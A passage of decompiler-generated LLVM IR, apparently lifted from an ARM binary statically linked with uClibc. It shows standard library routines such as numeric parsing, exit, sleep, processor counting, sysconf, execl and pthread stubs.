  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_142b429 = phi i32 [ %v0_14160, %bb60 ], [ %v1_142b430, %.thread8 ], [ %v1_142b430, %bb63 ]
  %v0_1423820 = phi i32 [ %v0_141cc, %bb60 ], [ %v0_1423821, %.thread8 ], [ %v0_1423821, %bb63 ]
  %v0_14218 = phi i32 [ %v0_1415c, %bb60 ], [ %v0_141ec, %.thread8 ], [ 16, %bb63 ]
  %v1_141f4 = add i32 %v0_14218, -2
  %tmp = icmp ugt i32 %v1_141f4, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_14204

.thread:                                          ; preds = %bb64
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_142b0

dec_label_pc_14204:                               ; preds = %bb64
  %v2_1420c = udiv i32 -1, %v0_14218
  %v3_1420c = urem i32 -1, %v0_14218
  %v1_1421c = urem i32 %v3_1420c, 256
  store i32 %v1_1421c, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 %v2_1420c, i32* %r8.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_14238

dec_label_pc_14234:                               ; preds = %bb71, %dec_label_pc_14294
  %v0_14234 = phi i32 [ %v1_1427444, %bb71 ], [ %v0_14234.pre, %dec_label_pc_14294 ]
  br label %dec_label_pc_14238

dec_label_pc_14238:                               ; preds = %dec_label_pc_14204, %dec_label_pc_14234
  %v1_142b427 = phi i32 [ %v1_142b429, %dec_label_pc_14204 ], [ %v0_14234, %dec_label_pc_14234 ]
  %v0_14274 = phi i32 [ %v0_1423820, %dec_label_pc_14204 ], [ %v0_14234, %dec_label_pc_14234 ]
  %v1_14238 = inttoptr i32 %v0_14274 to i8*
  %v2_14238 = load i8, i8* %v1_14238, align 1
  %v3_14238 = zext i8 %v2_14238 to i32
  %v1_1423c = add nsw i32 %v3_14238, -48
  %v1_14240 = urem i32 %v1_1423c, 256
  %v1_14248 = or i32 %v3_14238, 32
  store i32 %v1_14248, i32* @r2, align 4
  %tmp79 = icmp ult i32 %v1_14240, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_14250

dec_label_pc_14250:                               ; preds = %dec_label_pc_14238
  %v1_14254 = add nsw i32 %v1_14248, -87
  store i32 %v1_14254, i32* @r2, align 4
  %tmp80 = icmp ugt i32 %v1_14248, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_14250
  %v5_1425c = urem i32 %v1_14254, 256
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_14238, %dec_label_pc_14250, %bb65
  %v3_1428c = phi i32 [ %v1_14240, %dec_label_pc_14238 ], [ 40, %dec_label_pc_14250 ], [ %v5_1425c, %bb65 ]
  %v1_14260 = load i32, i32* %r5.global-to-local, align 4
  %v6_14264 = icmp slt i32 %v3_1428c, %v1_14260
  br i1 %v6_14264, label %dec_label_pc_14268, label %dec_label_pc_142b0.loopexit

dec_label_pc_14268:                               ; preds = %bb66
  %v0_14268 = load i32, i32* @ip, align 4
  %v1_14268 = load i32, i32* %r8.global-to-local, align 4
  %v9_14268 = icmp eq i32 %v0_14268, %v1_14268
  br i1 %v9_14268, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_14268
  %v1_1427440 = add i32 %v0_14274, 1
  store i32 %v1_1427440, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1427c

bb67:                                             ; preds = %dec_label_pc_14268
  %v3_14268 = icmp ult i32 %v0_14268, %v1_14268
  %v1_14274 = add i32 %v0_14274, 1
  store i32 %v1_14274, i32* %r4.global-to-local, align 4
  br i1 %v3_14268, label %dec_label_pc_1427c, label %dec_label_pc_14294

dec_label_pc_1427c:                               ; preds = %bb67, %.thread39
  %v1_1427444 = phi i32 [ %v1_1427440, %.thread39 ], [ %v1_14274, %bb67 ]
  %v4_142842443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_1427c = load i32, i32* %sl.global-to-local, align 4
  %v3_1427c = icmp uge i32 %v3_1428c, %v1_1427c
  %v9_1427c = icmp eq i32 %v3_1428c, %v1_1427c
  %v2_14280 = xor i1 %v3_1427c, true
  %v3_14280 = or i1 %v9_1427c, %v2_14280
  br i1 %v3_14280, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_1427c
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_1427c, %bb68
  %v4_14284 = phi i32 [ %v4_142842443, %dec_label_pc_1427c ], [ 0, %bb68 ]
  %v2_14284 = xor i1 %v9_1427c, true
  %v3_14284 = and i1 %v3_1427c, %v2_14284
  br i1 %v3_14284, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_14284 = urem i32 %v4_14284, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_14288 = phi i32 [ %v5_14284, %bb70 ], [ %v4_14284, %bb69 ]
  %v2_14288 = icmp eq i32 %v0_14288, 0
  br i1 %v2_14288, label %bb71, label %dec_label_pc_14294

bb71:                                             ; preds = %thread-pre-split
  %v4_1428c = mul i32 %v0_14268, %v1_14260
  %v5_1428c = add i32 %v4_1428c, %v3_1428c
  store i32 %v5_1428c, i32* @ip, align 4
  br label %dec_label_pc_14234

dec_label_pc_14294:                               ; preds = %bb67, %thread-pre-split
  %v0_14294 = call i32 @__GI___errno_location()
  %v0_1429c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1429c, i32* @ip, align 4
  %v0_142a0 = load i32, i32* %r7.global-to-local, align 4
  %v2_142a0 = and i32 %v0_142a0, %v0_14164
  store i32 %v2_142a0, i32* %r7.global-to-local, align 4
  %v2_142a8 = inttoptr i32 %v0_14294 to i32*
  store i32 34, i32* %v2_142a8, align 4
  %v0_14234.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14234

dec_label_pc_142b0.loopexit:                      ; preds = %bb66
  %v0_142b0.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_142b0

dec_label_pc_142b0:                               ; preds = %.thread, %dec_label_pc_142b0.loopexit
  %v1_142b4 = phi i32 [ %v1_142b427, %dec_label_pc_142b0.loopexit ], [ %v1_142b429, %.thread ]
  %v2_142b4 = phi i32 [ %v0_142b0.pre, %dec_label_pc_142b0.loopexit ], [ %v0_14158, %.thread ]
  %v2_142b0 = icmp eq i32 %v2_142b4, 0
  br i1 %v2_142b0, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_142b0
  %v3_142b4 = inttoptr i32 %v2_142b4 to i32*
  store i32 %v1_142b4, i32* %v3_142b4, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_142b0, %bb72
  %v0_142bc = load i32, i32* %r7.global-to-local, align 4
  %v2_142bc = icmp eq i32 %v0_142bc, 0
  %. = select i1 %v2_142bc, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v2_142c8 = icmp eq i32 %v0_14164, 0
  %v0_142ec.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_142c8, label %dec_label_pc_142e4, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_142ec.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_142d4, label %dec_label_pc_142e4

dec_label_pc_142d4:                               ; preds = %bb76
  %v0_142d4 = call i32 @__GI___errno_location()
  %v2_142dc = inttoptr i32 %v0_142d4 to i32*
  store i32 34, i32* %v2_142dc, align 4
  %v0_142e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_142e0, i32* @ip, align 4
  %v0_142e4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_142e4

dec_label_pc_142e4:                               ; preds = %bb76, %bb73, %dec_label_pc_142d4
  %v0_142ec.pre = phi i32 [ %v0_142ec.pre.pre, %bb76 ], [ %v0_142e0, %dec_label_pc_142d4 ], [ %v0_142ec.pre.pre, %bb73 ]
  %v0_142e4 = phi i32 [ %v0_142bc, %bb76 ], [ %v0_142e4.pre, %dec_label_pc_142d4 ], [ %v0_142bc, %bb73 ]
  %v2_142e4 = icmp eq i32 %v0_142e4, 0
  br i1 %v2_142e4, label %dec_label_pc_142e4._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_142e4
  %v2_142e8 = sub i32 0, %v0_142ec.pre
  store i32 %v2_142e8, i32* @ip, align 4
  br label %dec_label_pc_142e4._crit_edge

dec_label_pc_142e4._crit_edge:                    ; preds = %dec_label_pc_142e4, %bb77
  %v0_142ec = phi i32 [ %v2_142e8, %bb77 ], [ %v0_142ec.pre, %dec_label_pc_142e4 ]
  ret i32 %v0_142ec

; uselistorder directives
  uselistorder i32 %v0_142ec.pre, { 1, 0 }
  uselistorder i32 %v0_142ec.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_14284, { 1, 0 }
  uselistorder i1 %v3_1427c, { 1, 0 }
  uselistorder i32 %v1_1427c, { 1, 0 }
  uselistorder i32 %v1_14240, { 1, 0 }
  uselistorder i32 %v0_14274, { 1, 0, 2 }
  uselistorder i32 %v0_14234, { 1, 0 }
  uselistorder i32 %v3_141e4, { 1, 0 }
  uselistorder i32 %v1_141d8, { 1, 0, 2 }
  uselistorder i32 %v0_141cc, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_141a8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14164, { 1, 0 }
  uselistorder i32 %v0_14160, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1415c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_142e4._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_142e4, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_142b0, { 1, 0 }
  uselistorder label %dec_label_pc_14294, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14238, { 1, 0 }
  uselistorder label %dec_label_pc_14234, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_141ac, { 1, 0 }
  uselistorder label %dec_label_pc_141a8, { 1, 0 }
  uselistorder label %dec_label_pc_14170, { 1, 0 }
}

define i32 @__GI_exit(i16 %arg1) local_unnamed_addr {
entry:
  %tmp = sext i16 %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r5, align 4
  %v4_14310 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 92) to i32*), align 4
  store i32 %v4_14310, i32* @r4, align 4
  %v2_14318 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp, i32* @r6, align 4
  %v4_14330 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_14330)
  %v0_14344 = load i32, i32* @r5, align 4
  %v2_14344 = add i32 %v0_14344, 16
  %v3_14344 = inttoptr i32 %v2_14344 to i32*
  %v4_14344 = load i32, i32* %v3_14344, align 4
  call void @__pseudo_branch(i32 %v4_14344)
  %v0_14354 = load i32, i32* @r5, align 4
  %v2_14354 = add i32 %v0_14354, 27580
  %v3_14354 = inttoptr i32 %v2_14354 to i32*
  %v4_14354 = load i32, i32* %v3_14354, align 4
  %v2_14358 = icmp eq i32 %v4_14354, 0
  br i1 %v2_14358, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_14364 = xor i1 %v2_14358, true
  call void @__pseudo_cond_branch(i1 %v2_14364, i32 %v4_14354)
  store i32 %v2_14318, i32* @r0, align 4
  %v0_14374 = load i32, i32* @r5, align 4
  %v2_14374 = add i32 %v0_14374, 24
  %v3_14374 = inttoptr i32 %v2_14374 to i32*
  %v4_14374 = load i32, i32* %v3_14374, align 4
  call void @__pseudo_branch(i32 %v4_14374)
  %v0_14380 = call i32 @__GI___uClibc_fini()
  %v0_14388 = load i32, i32* @r5, align 4
  %v2_14388 = add i32 %v0_14388, -91848
  %v9_14388 = icmp eq i32 %v2_14388, 0
  br i1 %v9_14388, label %bb10, label %bb9

bb9:                                              ; preds = %.thread
  br label %bb10

bb10:                                             ; preds = %.thread, %bb9
  %v2_14390 = xor i1 %v9_14388, true
  call void @__pseudo_cond_branch(i1 %v2_14390, i32 %v2_14388)
  %v0_14394 = load i32, i32* @r6, align 4
  %sext = mul i32 %v0_14394, 65536
  %v1_14398 = sdiv i32 %sext, 65536
  %v2_14398 = call i32 @__GI__exit(i32 %v1_14398)
  %v0_1439c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1439c, label %.thread5, label %.thread6

.thread5:                                         ; preds = %bb10
  call void @llvm.trap()
  unreachable

.thread6:                                         ; preds = %bb10
  ret i32 %v2_14398

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_143bc = load i32, i32* @r4, align 4
  %v6_143bc = load i32, i32* @lr, align 4
  %v2_143c0 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r4, align 4
  br i1 %v2_143c0, label %dec_label_pc_14454, label %dec_label_pc_143d0

dec_label_pc_143d0:                               ; preds = %entry
  %v2_143e0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 65536, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v3_143f4 = call i32 @__libc_sigaction(i32 17, i32 0, i32 %v2_143e0)
  %v3_143f8 = load i32, i32* %stack_var_-44, align 4
  %v7_143fc = icmp eq i32 %v3_143f8, 1
  br i1 %v7_143fc, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_143d0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_143d0, %bb
  call void @__pseudo_cond_branch(i1 %v7_143fc, i32 ptrtoint (i32* @global_var_fb2c.803 to i32))
  %v2_14410 = ptrtoint i32* %stack_var_-16 to i32
  %v2_14418 = call i32 @__libc_nanosleep(i32 %v2_14410, i32 %v2_14410)
  %v2_1441c = icmp eq i32 %v2_14418, 0
  br i1 %v2_1441c, label %bb19, label %bb18

bb18:                                             ; preds = %.thread2
  %v3_14430 = load i32, i32* %stack_var_-16, align 4
  br label %bb19

bb19:                                             ; preds = %.thread2, %bb18
  %storemerge = phi i32 [ %v3_14430, %bb18 ], [ 0, %.thread2 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v3_14440 = load i32, i32* %stack_var_-24, align 4
  %v1_14444 = and i32 %v3_14440, 65536
  %v2_14444 = icmp eq i32 %v1_14444, 0
  br i1 %v2_14444, label %bb20, label %.thread6

bb20:                                             ; preds = %bb19
  br label %.thread6

.thread6:                                         ; preds = %bb19, %bb20
  call void @__pseudo_cond_branch(i1 %v2_14444, i32 ptrtoint (i32* @global_var_fb2c.803 to i32))
  %v0_14454.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14454

dec_label_pc_14454:                               ; preds = %entry, %.thread6
  %v0_14454 = phi i32 [ %v0_14454.pre, %.thread6 ], [ 0, %entry ]
  store i32 %v3_143bc, i32* @r4, align 4
  store i32 %v6_143bc, i32* @lr, align 4
  ret i32 %v0_14454

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14454, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33928), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_14488 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33928))
  store i32 %v1_14488, i32* @r6, align 4
  %v2_1448c = icmp eq i32 %v1_14488, 0
  br i1 %v2_1448c, label %dec_label_pc_1450c, label %dec_label_pc_14494

dec_label_pc_14494:                               ; preds = %entry
  store i32 1824, i32* @sl, align 4
  %v0_1449c = load i32, i32* @r4, align 4
  %v2_1449c = add i32 %v0_1449c, -33916
  store i32 %v2_1449c, i32* @r8, align 4
  %v2_144a0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_144a0, i32* @r7, align 4
  br label %bb18

dec_label_pc_144a8:                               ; preds = %bb18
  %v3_144a8 = load i32, i32* %stack_var_-36, align 4
  %v1_144ac = inttoptr i32 %v3_144a8 to i32*
  %v2_144ac = load i32, i32* %v1_144ac, align 4
  %v1_144b0 = inttoptr i32 %v2_144ac to i8*
  %v2_144b0 = load i8, i8* %v1_144b0, align 1
  %v7_144b4 = icmp eq i8 %v2_144b0, 99
  br i1 %v7_144b4, label %dec_label_pc_144bc, label %.backedge3

dec_label_pc_144bc:                               ; preds = %dec_label_pc_144a8
  %v1_144bc = add i32 %v2_144ac, 1
  %v2_144bc = inttoptr i32 %v1_144bc to i8*
  %v3_144bc = load i8, i8* %v2_144bc, align 1
  %v7_144c0 = icmp eq i8 %v3_144bc, 112
  br i1 %v7_144c0, label %dec_label_pc_144c8, label %.backedge3

dec_label_pc_144c8:                               ; preds = %dec_label_pc_144bc
  %v1_144c8 = add i32 %v2_144ac, 2
  %v2_144c8 = inttoptr i32 %v1_144c8 to i8*
  %v3_144c8 = load i8, i8* %v2_144c8, align 1
  %v7_144cc = icmp eq i8 %v3_144c8, 117
  br i1 %v7_144cc, label %dec_label_pc_144d4, label %.backedge3

dec_label_pc_144d4:                               ; preds = %dec_label_pc_144c8
  %v1_144d4 = add i32 %v2_144ac, 3
  %v2_144d4 = inttoptr i32 %v1_144d4 to i8*
  %v3_144d4 = load i8, i8* %v2_144d4, align 1
  %v4_144d4 = zext i8 %v3_144d4 to i32
  %v0_144d8 = load i32, i32* @r4, align 4
  %v1_144d8 = load i32, i32* @sl, align 4
  %v2_144d8 = add i32 %v1_144d8, %v0_144d8
  %v3_144d8 = inttoptr i32 %v2_144d8 to i32*
  %v4_144d8 = load i32, i32* %v3_144d8, align 4
  %v2_144dc = mul nuw nsw i32 %v4_144d4, 2
  %v2_144e0 = add i32 %v4_144d8, %v2_144dc
  %v3_144e0 = inttoptr i32 %v2_144e0 to i16*
  %v4_144e0 = load i16, i16* %v3_144e0, align 2
  %v1_144e4 = and i16 %v4_144e0, 8
  %v2_144e4 = icmp eq i16 %v1_144e4, 0
  br i1 %v2_144e4, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_144d4
  %v1_144e8 = load i32, i32* @r5, align 4
  %v2_144e8 = add i32 %v1_144e8, 1
  store i32 %v2_144e8, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_144d4, %dec_label_pc_144a8, %dec_label_pc_144bc, %dec_label_pc_144c8
  %v0_144ec.pre = load i32, i32* @r6, align 4
  %v0_144f8.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_14494
  %v0_144f8 = phi i32 [ %v0_144f8.pre, %.backedge3 ], [ %v2_1449c, %dec_label_pc_14494 ]
  %v0_144ec = phi i32 [ %v0_144ec.pre, %.backedge3 ], [ %v1_14488, %dec_label_pc_14494 ]
  %v4_144fc = inttoptr i32 %v0_144ec to i32*
  %v5_144fc = call i32 @__GI_config_read(i32* %v4_144fc, i32 %v2_144a0, i32 258, i32 %v0_144f8)
  %v2_14500 = icmp eq i32 %v5_144fc, 0
  br i1 %v2_14500, label %dec_label_pc_14570, label %dec_label_pc_144a8

dec_label_pc_1450c:                               ; preds = %entry
  %v0_14510 = load i32, i32* @r4, align 4
  %v2_14510 = add i32 %v0_14510, -33912
  store i32 %v2_14510, i32* @r0, align 4
  %v1_14514 = call i32 @__GI_config_open(i32 %v2_14510)
  store i32 %v1_14514, i32* @r6, align 4
  %v2_14518 = icmp eq i32 %v1_14514, 0
  br i1 %v2_14518, label %bb19, label %dec_label_pc_14524

bb19:                                             ; preds = %dec_label_pc_1450c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_14570

dec_label_pc_14524:                               ; preds = %dec_label_pc_1450c
  %v0_14528 = load i32, i32* @r4, align 4
  %v2_14528 = add i32 %v0_14528, -33896
  store i32 %v2_14528, i32* @r8, align 4
  %v2_14530 = add i32 %v0_14528, -33860
  store i32 %v2_14530, i32* @r7, align 4
  %v2_14534 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_14534, i32* @r4, align 4
  br label %bb21

dec_label_pc_1453c:                               ; preds = %bb21
  %v0_14568 = load i32, i32* @r8, align 4
  %v3_1453c = load i32, i32* %stack_var_-36, align 4
  %v1_14540 = inttoptr i32 %v3_1453c to i32*
  %v2_14540 = load i32, i32* %v1_14540, align 4
  store i32 %v2_14540, i32* @r1, align 4
  %v2_14544 = inttoptr i32 %v0_14568 to i8*
  %v3_14544 = call i32 @__GI_strcoll(i8* %v2_14544, i32 %v2_14540)
  %v2_14548 = icmp eq i32 %v3_14544, 0
  br i1 %v2_14548, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_1453c
  %v1_1454c = load i32, i32* @r5, align 4
  %v2_1454c = add i32 %v1_1454c, 1
  store i32 %v2_1454c, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_1453c
  %v0_14558.pre = load i32, i32* @r7, align 4
  %v0_1455c.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_14524
  %v0_1455c = phi i32 [ %v0_1455c.pre, %.backedge ], [ %v1_14514, %dec_label_pc_14524 ]
  %v0_14558 = phi i32 [ %v0_14558.pre, %.backedge ], [ %v2_14530, %dec_label_pc_14524 ]
  %v4_14560 = inttoptr i32 %v0_1455c to i32*
  %v5_14560 = call i32 @__GI_config_read(i32* %v4_14560, i32 %v2_14534, i32 459266, i32 %v0_14558)
  %v2_14564 = icmp eq i32 %v5_14560, 0
  br i1 %v2_14564, label %dec_label_pc_14570, label %dec_label_pc_1453c

dec_label_pc_14570:                               ; preds = %bb18, %bb21, %bb19
  %v0_14570 = load i32, i32* @r6, align 4
  %v1_14574 = inttoptr i32 %v0_14570 to i32*
  %v2_14574 = call i32 @__GI_config_close(i32* %v1_14574)
  %v0_14578 = load i32, i32* @r5, align 4
  %v2_14578 = icmp eq i32 %v0_14578, 0
  %.v0_14578 = select i1 %v2_14578, i32 1, i32 %v0_14578
  ret i32 %.v0_14578

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_14570, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_1499c

bb:                                               ; preds = %entry
  %v7_145c8 = mul i32 %arg1, 4
  %v8_145c8 = add i32 %v7_145c8, ptrtoint (i32* @global_var_145d0.815 to i32)
  call void @__pseudo_branch(i32 %v8_145c8)
  br label %dec_label_pc_1499c

dec_label_pc_1499c:                               ; preds = %bb, %entry
  %v0_1499c = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_149a8 = inttoptr i32 %v0_1499c to i32*
  store i32 22, i32* %v2_149a8, align 4
  %v0_14b58 = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_14b58

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_14b8c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_14b8c, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v2_14ba0 = ptrtoint i32* %stack_var_-40 to i32
  %v2_14ba4 = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_14bb4

dec_label_pc_14bb4:                               ; preds = %dec_label_pc_14bb4, %entry
  %v0_14bc8 = phi i32 [ 0, %entry ], [ %v1_14bc8, %dec_label_pc_14bb4 ]
  %stack_var_-36.0 = phi i32 [ %v2_14ba4, %entry ], [ %v1_14bbc, %dec_label_pc_14bb4 ]
  %v1_14bb8 = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_14bb8 = load i32, i32* %v1_14bb8, align 4
  %v1_14bbc = add i32 %stack_var_-36.0, 4
  %v2_14bc0 = icmp eq i32 %v2_14bb8, 0
  %v1_14bc8 = add i32 %v0_14bc8, 1
  store i32 %v1_14bc8, i32* @lr, align 4
  br i1 %v2_14bc0, label %dec_label_pc_14bd0, label %dec_label_pc_14bb4

dec_label_pc_14bd0:                               ; preds = %dec_label_pc_14bb4
  %v3_14bd0 = mul i32 %v1_14bc8, 4
  %v1_14bd4 = add i32 %v3_14bd0, 18
  %v1_14bd8 = and i32 %v1_14bd4, -8
  %v2_14bdc = sub i32 %v2_14ba0, %v1_14bd8
  %v2_14be4 = inttoptr i32 %v2_14bdc to i32*
  store i32 %arg2, i32* %v2_14be4, align 4
  %v0_14bf0 = load i32, i32* @sp, align 4
  store i32 %v0_14bf0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14bf8

dec_label_pc_14bf8:                               ; preds = %dec_label_pc_14bf8, %dec_label_pc_14bd0
  %v1_14c0c = phi i32 [ %v0_14bf0, %dec_label_pc_14bd0 ], [ %v5_14c0c, %dec_label_pc_14bf8 ]
  %stack_var_-36.1 = phi i32 [ %v2_14ba4, %dec_label_pc_14bd0 ], [ %v1_14c04, %dec_label_pc_14bf8 ]
  %v1_14bfc = inttoptr i32 %stack_var_-36.1 to i32*
  %v2_14bfc = load i32, i32* %v1_14bfc, align 4
  %v0_14c00 = load i32, i32* @lr, align 4
  %v1_14c00 = add i32 %v0_14c00, -1
  store i32 %v1_14c00, i32* @lr, align 4
  %v7_14c00 = icmp eq i32 %v0_14c00, 1
  %v1_14c04 = add i32 %stack_var_-36.1, 4
  %v2_14c0c = add i32 %v1_14c0c, 4
  %v3_14c0c = inttoptr i32 %v2_14c0c to i32*
  store i32 %v2_14bfc, i32* %v3_14c0c, align 4
  %v4_14c0c = load i32, i32* %ip.global-to-local, align 4
  %v5_14c0c = add i32 %v4_14c0c, 4
  store i32 %v5_14c0c, i32* %ip.global-to-local, align 4
  br i1 %v7_14c00, label %dec_label_pc_14c14, label %dec_label_pc_14bf8

dec_label_pc_14c14:                               ; preds = %dec_label_pc_14bf8
  %v0_14c20 = call i32 @__GI_execve()
  ret i32 %v0_14c20

; uselistorder directives
  uselistorder i32 %v5_14c0c, { 1, 0 }
  uselistorder i32 %v0_14c00, { 1, 0 }
  uselistorder i32 %v1_14bc8, { 0, 2, 1 }
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @usleep(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_14c40 = ptrtoint i32* %stack_var_-24 to i32
  %v2_14c4c = udiv i32 %arg1, 1000000
  store i32 %v2_14c4c, i32* %stack_var_-24, align 4
  %v2_14c74 = call i32 @__libc_nanosleep(i32 %v2_14c40, i32 0)
  ret i32 %v2_14c74
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_14c98 = add i32 %tmp, 4
  %v4_14c98 = inttoptr i32 %v3_14c98 to i32*
  store i32 %arg3, i32* %v4_14c98, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_14ca4 = icmp eq i32 %arg2, 0
  br i1 %v2_14ca4, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v3_14cbc = call i32 @unknown_0()
  ret i32 %v3_14cbc

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
